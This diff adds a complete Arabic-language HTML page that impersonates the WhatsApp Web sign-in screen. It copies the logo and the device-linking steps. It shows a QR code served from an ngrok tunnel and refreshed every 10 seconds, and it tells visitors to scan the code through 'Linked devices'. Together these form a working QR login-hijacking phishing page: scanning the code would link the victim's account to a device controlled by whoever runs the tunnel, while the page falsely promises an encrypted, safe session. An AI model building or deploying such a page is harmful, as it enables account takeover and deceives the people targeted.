@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>WhatsApp Web | تسجيل الدخول - الوضع المظلم</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', sans-serif;
+            background: #0a0c0a;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            background: #1e2a1f;
+            border-radius: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
+            overflow: hidden;
+            border: 1px solid rgba(37,211,102,0.2);
+        }
+        .split-layout {
+            display: flex;
+            flex-wrap: wrap;
+        }
+        .instructions-section,
+        .qrcode-section {
+            flex: 1;
+            min-width: 280px;
+            padding: 48px 40px;
+        }
+        .instructions-section {
+            background: #111b12;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .qrcode-section {
+            background: #0a130c;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-right: 1px solid rgba(37,211,102,0.15);
+        }
+        /* شعار وتعليمات */
+        .logo-area { margin-bottom: 32px; }
+        .whatsapp-icon { display: inline-flex; align-items: center; gap: 12px; background: rgba(37,211,102,0.12); padding: 8px 20px 8px 16px; border-radius: 60px; }
+        .whatsapp-icon svg { width: 36px; height: 36px; }
+        .logo-text { font-size: 1.6rem; font-weight: 600; color: #25D366; letter-spacing: -0.3px; }
+        h1 { font-size: 1.9rem; font-weight: 600; color: #fff; margin-bottom: 20px; line-height: 1.3; }
+        .step-list { margin: 28px 0 24px; list-style: none; }
+        .step-list li { display: flex; align-items: flex-start; gap: 16px; margin-bottom: 28px; font-size: 1rem; line-height: 1.5; color: #e0e0e0; }
+        .step-number { background: #25D366; color: #0a130c; width: 32px; height: 32px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-weight: 800; flex-shrink: 0; box-shadow: 0 4px 12px rgba(37,211,102,0.3); }
+        .step-text strong { color: #25D366; font-weight: 600; }
+        .helper-text { background: rgba(37,211,102,0.08); padding: 18px 20px; border-radius: 20px; margin: 20px 0 10px; font-size: 0.9rem; color: #ccc; border-right: 4px solid #25D366; }
+        .security-note { display: flex; align-items: center; gap: 12px; margin-top: 32px; font-size: 0.8rem; color: #9e9e9e; border-top: 1px solid rgba(37,211,102,0.15); padding-top: 24px; }
+        /* QR */
+        .qr-card { text-align: center; width: 100%; max-width: 320px; }
+        .qr-title { font-weight: 600; font-size: 1.2rem; color: #fff; margin-bottom: 12px; }
+        .qr-sub { font-size: 0.85rem; color: #b0b0b0; margin-bottom: 28px; }
+        .qr-placeholder { background: rgba(0,0,0,0.5); padding: 20px; border-radius: 32px; width: 100%; transition: transform 0.2s ease; }
+        .qr-placeholder:hover { transform: scale(1.01); }
+        .qr-box { background: #0a130c; border-radius: 24px; padding: 16px; border: 1px solid rgba(37,211,102,0.3); position: relative; }
+        #qr-image { 
+            width: 100%; 
+            height: auto; 
+            display: block; 
+            border-radius: 20px; 
+            background: #021002; 
+        }
+        .qr-corner-tl, .qr-corner-tr, .qr-corner-bl {
+            position: absolute;
+            width: 45px; height: 45px;
+            border: 3px solid #25D366;
+            z-index: 2;
+        }
+        .qr-corner-tl { top: 15px; left: 15px; border-right: none; border-bottom: none; border-radius: 12px 0 0 0; }
+        .qr-corner-tr { top: 15px; right: 15px; border-left: none; border-bottom: none; border-radius: 0 12px 0 0; }
+        .qr-corner-bl { bottom: 15px; left: 15px; border-right: none; border-top: none; border-radius: 0 0 0 12px; }
+        .qr-footnote { margin-top: 24px; font-size: 0.8rem; color: #9e9e9e; background: rgba(37,211,102,0.08); padding: 10px 16px; border-radius: 60px; display: inline-block; }
+        /* Responsive */
+        @media (max-width: 800px) {
+            .split-layout { flex-direction: column-reverse; }
+            .qrcode-section { border-right: none; border-bottom: 1px solid rgba(37,211,102,0.15); }
+        }
+        @media (max-width: 480px) {
+            body { padding: 12px; }
+            .qr-corner-tl, .qr-corner-tr, .qr-corner-bl { width: 35px; height: 35px; border-width: 2px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="split-layout">
+            <!-- قسم QR -->
+            <div class="qrcode-section">
+                <div class="qr-card">
+                    <div class="qr-title">امسح رمز الاستجابة السريعة</div>
+                    <div class="qr-sub">باستخدام تطبيق WhatsApp على هاتفك</div>
+                    <div class="qr-placeholder">
+                        <div class="qr-box">
+                            <img id="qr-image" 
+                                 src="https://unslumbrous-nonambitiously-zaid.ngrok-free.dev/qr_code.png"
+                                 alt="رمز QR لتسجيل الدخول في WhatsApp Web"
+                                 loading="lazy">
+                            <div class="qr-corner-tl"></div>
+                            <div class="qr-corner-tr"></div>
+                            <div class="qr-corner-bl"></div>
+                        </div>
+                    </div>
+                    <div class="qr-footnote">
+                        ⚡ الرمز يتجدد تلقائيًا للحفاظ على الأمان
+                    </div>
+                </div>
+            </div>
+
+            <!-- قسم التعليمات -->
+            <div class="instructions-section">
+                <div class="logo-area">
+                    <div class="whatsapp-icon">
+                        <svg viewBox="0 0 24 24" width="36" height="36" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2C6.48 2 2 6.48 2 12c0 1.82.46 3.55 1.28 5.07L2 22l4.93-1.28A9.94 9.94 0 0012 22c5.52 0 10-4.48 10-10S17.52 2 12 2z" fill="#25D366"/>
+                            <path d="M16.96 14.07c-.2-.1-1.2-.59-1.38-.66-.19-.07-.32-.1-.46.1-.14.19-.53.66-.65.8-.12.13-.24.14-.44.05-.2-.09-.85-.31-1.62-1-.6-.54-1-1.2-1.12-1.4-.12-.2-.01-.31.09-.41.09-.09.2-.23.3-.35.1-.12.13-.2.2-.34.07-.14.03-.26-.02-.36-.05-.1-.45-1.1-.62-1.5-.16-.4-.33-.34-.45-.34-.11 0-.24-.01-.37-.01a.71.71 0 00-.52.24c-.18.2-.68.66-.68 1.62 0 .96.7 1.89.8 2.02.1.13 1.38 2.1 3.34 2.95.47.2.83.32 1.12.41.47.15.9.13 1.24.08.38-.05 1.18-.48 1.34-.94.16-.46.16-.86.11-.94-.05-.08-.18-.13-.38-.23z" fill="white"/>
+                        </svg>
+                        <span class="logo-text">WhatsApp Web</span>
+                    </div>
+                </div>
+                <h1>سجّل الدخول إلى<br>WhatsApp Web</h1>
+                <ul class="step-list">
+                    <li><div class="step-number">1</div><div class="step-text"><strong>افتح WhatsApp على هاتفك</strong><br>تأكد من تثبيت التطبيق على جهازك الأندرويد أو iPhone.</div></li>
+                    <li><div class="step-number">2</div><div class="step-text"><strong>اذهب إلى الإعدادات أو الأجهزة المرتبطة</strong><br>على أندرويد: اضغط على القائمة (⋮) ثم "الأجهزة المرتبطة".<br>على iPhone: انتقل إلى "الإعدادات" ثم "الأجهزة المرتبطة".</div></li>
+                    <li><div class="step-number">3</div><div class="step-text"><strong>امسح رمز QR الظاهر</strong><br>اضغط على "<strong>ربط جهاز</strong>" وقم بتوجيه الكاميرا نحو رمز QR الظاهر على الشاشة.</div></li>
+                </ul>
+                <div class="helper-text">
+                    <i>🔒</i> جلسة مشفرة بالكامل – رسائلك ومكالماتك خاصة وآمنة.
+                </div>
+                <div class="security-note">
+                    <span>✅</span> يبقى حسابك مسجلاً حتى تقوم بتسجيل الخروج من الهاتف.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- سكريبت لتحديث الصورة تلقائيًا كل 10 ثوانٍ -->
+    <script>
+    function refreshQR() {
+        const img = document.getElementById('qr-image');
+        if (img) {
+            img.src = "https://unslumbrous-nonambitiously-zaid.ngrok-free.dev/qr_code.png?" + new Date().getTime();
+        }
+    }
+    setInterval(refreshQR, 10000); // كل 10 ثواني
+    window.addEventListener('load', refreshQR);
+    </script>
+</body>
+</html>
